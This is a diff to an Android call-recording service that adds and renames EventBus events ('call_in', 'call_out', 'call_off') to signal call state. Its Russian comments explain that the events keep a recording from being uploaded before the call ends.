@@ -119,6 +119,7 @@ public class TService extends Service {
 //                        Toast.makeText(context, "IN : " + inCall, Toast.LENGTH_LONG).show();
                     } else if (state.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
                         if (wasRinging == true) {
+                            EventBus.getDefault().post(new EventBusData("call_in"));//флаг что идет запись разгавора и не начинать занрузку файла (ато удалится)
 
 //                            Toast.makeText(context, "ANSWERED", Toast.LENGTH_LONG).show();
 
@@ -168,7 +169,7 @@ public class TService extends Service {
                             recorder.stop();
                             recordstarted = false;
                         }
-                        EventBus.getDefault().post(new EventBusData("telephone"));
+                        EventBus.getDefault().post(new EventBusData("call_off"));
                     }
                 }
             } else if (intent.getAction().equals(ACTION_OUT)) {
@@ -178,6 +179,7 @@ public class TService extends Service {
                     if (!outCall.contains("*") || !outCall.contains("#")){
                         outCall = outCall.replace("+", "");
 
+                        EventBus.getDefault().post(new EventBusData("call_out"));//флаг что идет запись разгавора и не начинать занрузку файла (ато удалится)
                         Log.i("MyMsg", "Name on ACTION_OUT "+outCall);
 //                    Toast.makeText(context, "OUT : " + outCall, Toast.LENGTH_LONG).show();
                     ////////////////////////////////////////////////////////////
@@ -231,7 +233,7 @@ public class TService extends Service {
                             recorder.stop();
                             recordstarted = false;
                         }
-                EventBus.getDefault().post(new EventBusData("telephone"));//разгоаор записан говорим "загрузи файл"
+                EventBus.getDefault().post(new EventBusData("call_off"));//разгоаор записан говорим "загрузи файл"
                     }
 
            // AsyncR ad = new AsyncR(context);
